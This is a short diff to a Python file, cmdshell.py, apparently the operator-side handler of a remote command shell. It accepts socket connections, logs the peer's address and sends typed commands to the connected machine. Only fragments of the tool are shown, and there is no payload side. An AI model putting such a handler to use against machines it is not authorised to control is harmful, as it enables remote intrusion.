@@ -2,6 +2,7 @@
 # @FileName  :cmdshell.py
 # @Time      :2022/11/08 18:19:18
 # @Author    :D0WE1L1N
+# CMDshell库：定义了一个开启cmd远程命令的函数
 import socket
 import sys
 import time
@@ -28,7 +29,10 @@ def start(ip, port):
         print("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
         sys.exit(1)
     while True:
-        cmd_SessObj,CMDIP = cmd_session.accept()
+        cmd_SessObj,addr = cmd_session.accept()
+        _ip = addr[0]
+        _port = addr[1]
+        print("CMD_SHELL>[+]CMD session Created:" + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
         while True:
             cmd_command = input("CMD_SHELL>")
             cmd_SessObj.send(bytes(cmd_command, 'utf8'))
